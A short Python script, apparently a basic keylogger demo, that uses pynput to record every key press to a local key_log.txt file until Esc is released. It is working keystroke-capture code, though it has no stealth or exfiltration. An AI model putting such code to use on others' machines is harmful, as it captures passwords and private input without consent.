from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open("key_log.txt", "a") as log_file:
            if hasattr(key, 'char'):
                log_file.write(f"{key.char}")
            else:
                log_file.write(f" [{key}] ")
    except Exception as e:
        print(f"Błąd: {e}")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
